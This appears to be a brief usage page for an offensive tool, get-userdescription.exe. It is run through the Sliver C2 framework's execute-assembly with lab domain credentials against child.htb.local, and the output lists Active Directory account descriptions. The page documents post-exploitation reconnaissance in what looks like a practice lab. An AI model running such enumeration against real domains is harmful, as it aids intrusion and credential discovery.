# Usage of get-userdescription.exe


## Usage
```
execute-assembly /home/kali/Desktop/c2/payloads/get-userdescription.exe -domain child.htb.local -username eric -password Letmein123
```

## Output
```

sliver (EXCESSIVE_SCOOTER) > execute-assembly /home/kali/Desktop/c2/payloads/get-userdescription.exe -domain child.htb.local -username eric -password Letmein123

[*] Output:
Distinguished name: CN=Administrator,CN=Users,DC=child,DC=htb,DC=local
Description: Built-in account for administering the computer/domain
Distinguished name: CN=Guest,CN=Users,DC=child,DC=htb,DC=local
Description: Built-in account for guest access to the computer/domain
Distinguished name: CN=krbtgt,CN=Users,DC=child,DC=htb,DC=local
Description: Key Distribution Center Service Account
Distinguished name: CN=svc sql,OU=Service Account,DC=child,DC=htb,DC=local
Description: SQL Server Manager.
Distinguished name: CN=alice,CN=Users,DC=child,DC=htb,DC=local
Description: User who can monitor srv01 via RDP
Distinguished name: CN=bob,CN=Users,DC=child,DC=htb,DC=local
Description: User who can manage srv02 via WinRM
Distinguished name: CN=carrot,CN=Users,DC=child,DC=htb,DC=local
Description: I am the king!
Distinguished name: CN=david,CN=Users,DC=child,DC=htb,DC=local
Description: My password is super safe!

```
